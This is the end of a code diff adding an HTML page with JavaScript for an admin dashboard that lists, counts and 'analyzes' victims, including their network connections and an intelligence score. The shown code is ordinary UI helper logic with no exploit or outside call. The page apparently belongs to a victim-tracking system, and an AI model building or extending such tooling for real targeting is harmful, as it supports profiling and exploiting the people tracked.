+            } catch (error) {
+                console.error('Error loading recommendations:', error);
+                showAlert('Error loading recommendations', 'danger');
+            }
+        }
+        
+        // Analyze victim
+        async function analyzeVictim(victimId) {
+            try {
+                showAlert('Starting victim analysis...', 'info');
+                
+                const response = await fetch(`/api/admin/victims/bulk/analyze?victim_ids=${victimId}&include_network=true`);
+                const data = await response.json();
+                
+                if (data.analyzed_count > 0) {
+                    showAlert('Victim analysis completed', 'success');
+                    loadVictims(currentPage); // Refresh the list
+                } else {
+                    showAlert('No analysis data available', 'warning');
+                }
+                
+            } catch (error) {
+                console.error('Error analyzing victim:', error);
+                showAlert('Error analyzing victim', 'danger');
+            }
+        }
+        
+        // Update statistics
+        function updateStatistics() {
+            document.getElementById('totalVictims').textContent = currentVictims.length;
+            document.getElementById('activeAnalysis').textContent = currentVictims.filter(v => v.intelligence_score > 0).length;
+        }
+        
+        // Utility functions
+        function showLoading(elementId) {
+            document.getElementById(elementId).style.display = 'block';
+        }
+        
+        function hideLoading(elementId) {
+            document.getElementById(elementId).style.display = 'none';
+        }
+        
+        function showAlert(message, type) {
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
+            alertDiv.innerHTML = `
+                ${message}
+                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+            `;
+            
+            document.body.insertBefore(alertDiv, document.body.firstChild);
+            
+            setTimeout(() => {
+                alertDiv.remove();
+            }, 5000);
+        }
+        
+        function debounce(func, wait) {
+            let timeout;
+            return function executedFunction(...args) {
+                const later = () => {
+                    clearTimeout(timeout);
+                    func(...args);
+                };
+                clearTimeout(timeout);
+                timeout = setTimeout(later, wait);
+            };
+        }
+        
+        function refreshData() {
+            loadVictims(currentPage);
+        }
+        
+        function refreshNetworkGraph() {
+            loadNetworkGraph();
+        }
+        
+        function exportNetworkGraph() {
+            // Implementation for exporting network graph
+            showAlert('Network graph export feature coming soon', 'info');
+        }
+        
+        function downloadFile(data) {
+            // Implementation for downloading exported data
+            showAlert('Export completed', 'success');
+        }
+    </script>
+</body>
+</html>
